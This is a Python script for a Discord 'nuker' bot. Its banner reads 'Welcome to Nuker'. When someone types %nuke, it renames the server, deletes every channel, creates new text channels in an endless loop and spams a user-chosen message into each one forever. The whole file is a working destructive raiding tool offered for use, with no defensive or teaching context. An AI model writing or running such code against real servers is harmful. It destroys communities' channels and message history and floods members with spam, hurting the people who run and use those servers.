# imports
import discord
from discord.ext import commands
import time
print(""""
█░█░█ █▀▀ █░░ █▀▀ █▀█ █▀▄▀█ █▀▀   ▀█▀ █▀█   █▄░█ █░█ █▄▀ █▀▀ █▀█
▀▄▀▄▀ ██▄ █▄▄ █▄▄ █▄█ █░▀░█ ██▄   ░█░ █▄█   █░▀█ █▄█ █░█ ██▄ █▀▄""")


time.sleep(1)
Servername = input("What would you want to change the sever name to: ")
Channelname = input("What would you like to change the channel names to: ")
Messagespam = input("What message would you like to spam: ")
Token = input("What is your bots token: ")

#client
client = commands.Bot(command_prefix="%",
                      intents=discord.Intents.all())  


#help ig idk
@client.event
async def on_ready():
  print("Type %nuke in the sever to nuke it")

#stuff that dose the main stuff
@client.command()
async def nuke(ctx):
  await ctx.guild.edit(name=Servername)
  try:
    for channel in ctx.guild.channels:
      await channel.delete()
      print("Deleted {}".format(channel))
  except Exception as e:
    print("Can't delete channel:", e)

  try:
    while True:
      await ctx.guild.create_text_channel(Channelname)
  except Exception as e:
    print("Can't create channel:", e)


#creating channels and sending messages
@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(Messagespam)

#your token
client.run(Token)
